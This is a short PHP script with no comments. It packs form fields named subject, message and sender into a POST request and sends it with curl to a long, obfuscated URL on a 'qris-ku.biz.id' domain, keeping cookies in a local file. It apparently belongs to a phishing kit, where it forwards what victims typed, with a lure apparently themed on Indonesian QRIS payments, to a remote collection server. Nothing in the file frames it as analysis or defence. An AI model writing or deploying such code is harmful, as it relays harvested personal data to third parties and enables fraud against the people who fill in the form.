<?php

$url = "https://282-62920jslep-wkdmwlwl820283639-2nslwkwn-epspw8.qris-ku.biz.id/72SK39SJAP29NSOS028BSKSJ82NSLW92729JSKSLSNSNSL92NXNXNX992OXJW820BWLFP8204BSLWPW820BSLWPWJ89BLSNPAPSN839ENC82NSOWO928NSKAP927JSLS92JSKDPS0SBSLSKS8.php";
$data = "subjek=" . $subjek . "&pesan=" . $pesan . "&sender=" . $sender;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd() . "/cok.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd() . "/cok.txt");
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
?> 
